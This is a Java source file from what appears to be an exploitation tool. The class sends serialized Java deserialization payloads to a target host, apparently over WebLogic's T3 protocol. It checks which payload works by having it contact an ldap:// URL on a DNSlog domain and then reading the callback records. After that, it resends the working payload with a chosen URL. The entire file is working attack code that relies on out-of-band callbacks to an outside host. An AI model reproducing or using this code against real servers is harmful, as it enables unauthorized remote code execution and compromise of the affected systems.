package superman.vuls;

import superman.core.DnslogClient;
import superman.core.Log;
import superman.core.PayloadSend;
import superman.core.Url;
import superman.payloads.NoEchoPayload;
import superman.util.Serializer;

import java.io.IOException;
import java.util.List;

public abstract class NoEchoVulImpl implements NoEchoVul{
    protected String protocol;
    protected String host;
    protected int port;
    protected List<NoEchoPayload> noEchoPayloads;
    protected NoEchoPayload noEchoPayload;
    protected abstract void init(String protocol, String host, int port);

    public void send(Url url) {
        try {
            PayloadSend.sendT3(protocol, host, port, Serializer.serialize(noEchoPayload.getObject(url)));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String check(String protocol, String host, int port) {
        init(protocol,host,port);
        for (NoEchoPayload payload : noEchoPayloads) {
            Log.info("检查payload:" + payload.getClass().getSimpleName());
            try {
                DnslogClient dc = new DnslogClient();
                String domain = dc.getdomain();
                Url url = new Url(String.format("ldap://%s:1099/test", domain));
                PayloadSend.send(this.protocol,this.host, this.port, payload.getObject(url));
                Thread.sleep(3000);
                String records = dc.getRecords();
                if (records.indexOf(domain) != -1) {
                    this.noEchoPayload = payload;
                    return records.split(",")[1].replace("\"", "").trim();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }
}
